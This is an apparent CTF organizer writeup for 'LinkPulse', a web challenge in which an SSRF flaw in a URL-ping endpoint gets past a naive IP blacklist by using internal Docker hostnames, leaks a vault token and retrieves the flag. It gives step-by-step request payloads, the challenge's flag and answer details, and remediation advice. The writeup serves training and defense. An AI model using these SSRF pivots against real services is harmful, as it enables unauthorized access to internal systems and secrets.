# Challenge 2: LinkPulse — Official Organizer Writeup

* **Category**: Web / Cloud & Network Security (SSRF Pivot)
* **Difficulty**: Medium
* **Points**: 250
* **Flag**: `CTF{ssrf_t0_1nt3rn4l_p1v0t_fl4g_2026}`

---

## 📖 Challenge Description for Players
> *LinkPulse provides an automated webhook delivery and latency testing engine. To prevent abuse, they implemented an IP blacklist filter protecting internal subnets. However, rumors say an unexposed internal authentication vault is reachable inside their cloud container network. Can you pivot through LinkPulse and extract the flag?*
>
> **Target**: `http://<HOST_IP>:8002`

---

## 🎯 Intended Vulnerability & Exploit Paths

### Step 1: Discovering SSRF & Filter Weakness
The application takes any URL in `/api/ping` and performs an HTTP GET request from the backend server.
When submitting `http://127.0.0.1` or `http://localhost`, the server returns a `403 Forbidden` error from the naive IP blacklist regex.

### Step 2: Pivoting to Internal Docker Network
Since the blacklist only checks raw IP formats (`127.0.0.1`, `10.x.x.x`), internal DNS names are unblocked.
In standard containerized environments, internal services communicate over their hostname (e.g., `internal-vault` or `backend` or `vault`).
Submitting:
```json
{
  "url": "http://internal-vault:5000/"
}
```
Returns:
```json
{
  "service": "Core Security Vault (Internal Network Gateway)",
  "documentation": "/api/docs"
}
```

### Step 3: API Discovery & Secret Token Retrieval
By requesting `http://internal-vault:5000/api/docs`, the internal service leaks its endpoints:
```json
{
  "path": "/api/v1/admin/flag",
  "auth": {
    "or_query_param": "token",
    "required_token": "corp_internal_secret_99812"
  }
}
```

### Step 4: Exfiltrating the Flag
Submitting:
```json
{
  "url": "http://internal-vault:5000/api/v1/admin/flag?token=corp_internal_secret_99812"
}
```
Returns:
```json
{
  "flag": "CTF{ssrf_t0_1nt3rn4l_p1v0t_fl4g_2026}"
}
```

---

## 🛡️ Remediation / Real-World Takeaways
1. Never rely on string-based blacklists for SSRF protection.
2. Resolve DNS queries before connection and enforce IP validation against RFC 1918 private ranges at the socket level.
3. Keep internal microservices authenticated with mutual TLS (mTLS) or robust JWT authorization.
